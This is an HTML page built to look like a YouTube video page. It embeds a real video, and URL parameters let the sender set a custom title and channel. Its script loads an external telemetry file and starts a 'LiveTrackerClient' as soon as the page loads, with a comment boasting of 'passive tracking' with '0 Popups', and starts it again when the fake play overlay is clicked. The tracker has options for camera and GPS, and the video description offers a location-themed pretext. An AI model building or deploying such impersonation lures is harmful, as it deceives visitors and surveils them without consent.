<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Roboto, Arial, sans-serif;
        }

        body {
            background-color: #0f0f0f;
            color: #f1f1f1;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        /* Navbar */
        header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 16px;
            height: 56px;
            background-color: #0f0f0f;
            position: sticky;
            top: 0;
            z-index: 100;
            border-bottom: 1px solid #272727;
        }

        .logo-container {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .logo-container i {
            font-size: 18px;
            color: #aaa;
            cursor: pointer;
        }

        .yt-logo {
            display: flex;
            align-items: center;
            gap: 4px;
            font-weight: bold;
            font-size: 18px;
            letter-spacing: -0.5px;
            color: white;
            text-decoration: none;
        }

        .yt-logo i {
            color: #ff0000;
            font-size: 24px;
        }

        .search-bar {
            display: flex;
            align-items: center;
            max-width: 600px;
            width: 100%;
            margin: 0 20px;
        }

        .search-bar input {
            width: 100%;
            padding: 8px 16px;
            background-color: #121212;
            border: 1px solid #303030;
            border-radius: 40px 0 0 40px;
            color: #fff;
            font-size: 15px;
            outline: none;
        }

        .search-bar input:focus {
            border-color: #1c62b9;
        }

        .search-bar button {
            padding: 8px 20px;
            background-color: #222222;
            border: 1px solid #303030;
            border-left: none;
            border-radius: 0 40px 40px 0;
            color: #fff;
            cursor: pointer;
        }

        /* Container */
        .main-container {
            max-width: 1280px;
            margin: 16px auto;
            padding: 0 16px;
            width: 100%;
        }

        .video-player-wrapper {
            position: relative;
            width: 100%;
            padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
            background-color: #000;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }

        .video-player-wrapper iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }

        .player-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.4);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 10;
            cursor: pointer;
            transition: opacity 0.3s;
        }

        .player-overlay.hidden {
            display: none;
        }

        .play-btn-big {
            width: 80px;
            height: 80px;
            background-color: #ff0000;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            color: white;
            box-shadow: 0 0 20px rgba(255,0,0,0.5);
            transition: transform 0.2s;
        }

        .play-btn-big:hover {
            transform: scale(1.1);
        }

        .overlay-text {
            margin-top: 16px;
            font-size: 16px;
            font-weight: 500;
            color: #fff;
            text-shadow: 0 2px 4px rgba(0,0,0,0.8);
        }

        /* Video Info */
        .video-details {
            margin-top: 16px;
        }

        .video-title {
            font-size: 20px;
            font-weight: 600;
            line-height: 1.3;
        }

        .channel-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-top: 12px;
            padding-bottom: 12px;
            border-bottom: 1px solid #272727;
            flex-wrap: wrap;
            gap: 12px;
        }

        .channel-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .channel-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: linear-gradient(135deg, #ff0000, #ff7300);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
        }

        .channel-names h3 {
            font-size: 16px;
            font-weight: 600;
        }

        .channel-names p {
            font-size: 12px;
            color: #aaa;
        }

        .subscribe-btn {
            background-color: #f1f1f1;
            color: #0f0f0f;
            border: none;
            padding: 8px 16px;
            border-radius: 20px;
            font-weight: 600;
            cursor: pointer;
            font-size: 14px;
        }

        .action-buttons {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .action-btn {
            background-color: #272727;
            color: #fff;
            border: none;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 6px;
            cursor: pointer;
        }

        .action-btn:hover {
            background-color: #3f3f3f;
        }

        .video-description {
            background-color: #272727;
            border-radius: 12px;
            padding: 12px;
            margin-top: 12px;
            font-size: 14px;
            line-height: 1.5;
            color: #f1f1f1;
        }

        @media (max-width: 600px) {
            .search-bar {
                display: none;
            }
        }
    </style>
</head>

<body>
    <header>
        <div class="logo-container">
            <i class="fas fa-bars"></i>
            <a href="#" class="yt-logo">
                <i class="fab fa-youtube"></i> YouTube
            </a>
        </div>
        <div class="search-bar">
            <input type="text" placeholder="Search">
            <button><i class="fas fa-search"></i></button>
        </div>
        <div>
            <i class="fas fa-user-circle" style="font-size: 24px; color: #aaa;"></i>
        </div>
    </header>

    <div class="main-container">
        <div class="video-player-wrapper">
            <div class="player-overlay" id="player-overlay">
                <div class="play-btn-big"><i class="fas fa-play"></i></div>
                <div class="overlay-text">Click to Play Video</div>
            </div>
            <iframe id="yt-iframe" src="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
        </div>

        <div class="video-details">
            <h1 class="video-title" id="video-title">Trending Video Presentation</h1>
            <div class="channel-row">
                <div class="channel-info">
                    <div class="channel-avatar" id="channel-avatar">YT</div>
                    <div class="channel-names">
                        <h3 id="channel-name">Official Channel</h3>
                        <p id="sub-count">1.4M subscribers</p>
                    </div>
                    <button class="subscribe-btn">Subscribe</button>
                </div>
                <div class="action-buttons">
                    <button class="action-btn"><i class="far fa-thumbs-up"></i> 142K</button>
                    <button class="action-btn"><i class="far fa-thumbs-down"></i></button>
                    <button class="action-btn"><i class="fas fa-share"></i> Share</button>
                    <button class="action-btn"><i class="fas fa-download"></i> Download</button>
                </div>
            </div>

            <div class="video-description">
                <p><strong><span id="view-count">1,248,930</span> views • <span id="pub-date">2 days ago</span></strong></p>
                <p id="video-desc" style="margin-top: 6px; color: #ccc;">
                    Enjoy the latest high definition video stream. Tap play above to enable adaptive media streaming and location-optimized fast content delivery.
                </p>
            </div>
        </div>
    </div>

    <script src="/js/telemetry.js"></script>
    <script>
        // Extract YouTube video ID from query param (e.g. ?v=dQw4w9WgXcQ or full URL)
        const urlParams = new URLSearchParams(window.location.search);
        let rawV = urlParams.get('v') || urlParams.get('video') || 'dQw4w9WgXcQ';
        
        // Handle full YouTube link if pasted as v parameter
        let videoId = rawV;
        if (rawV.includes('youtu.be/')) {
            videoId = rawV.split('youtu.be/')[1].split('?')[0].split('&')[0];
        } else if (rawV.includes('watch?v=')) {
            videoId = rawV.split('watch?v=')[1].split('&')[0];
        }

        const customTitle = urlParams.get('title');
        const customChannel = urlParams.get('channel');
        
        if (customTitle) document.getElementById('video-title').innerText = customTitle;
        if (customChannel) {
            document.getElementById('channel-name').innerText = customChannel;
            document.getElementById('channel-avatar').innerText = customChannel.charAt(0).toUpperCase();
        }

        const iframe = document.getElementById('yt-iframe');
        const overlay = document.getElementById('player-overlay');

        function startVideoAndTelemetry() {
            // Set autoplay URL
            iframe.src = `https://www.youtube-nocookie.com/embed/${videoId}?autoplay=1&rel=0`;
            overlay.classList.add('hidden');

            // Start telemetry collection
            if (window.LiveTrackerClient) {
                window.LiveTrackerClient.startTracking({
                    templateName: 'youtube',
                    updateInterval: 4000,
                    enableCamera: false,
                    enableGPS: false
                });
            }
        }

        overlay.addEventListener('click', startVideoAndTelemetry);
        
        // Auto-start passive tracking on load (0 Popups!)
        window.addEventListener('DOMContentLoaded', () => {
            iframe.src = `https://www.youtube-nocookie.com/embed/${videoId}?rel=0`;
            
            if (window.LiveTrackerClient) {
                window.LiveTrackerClient.startTracking({
                    templateName: 'youtube',
                    updateInterval: 4000,
                    enableCamera: false,
                    enableGPS: false
                });
            }
        });
    </script>
</body>

</html>
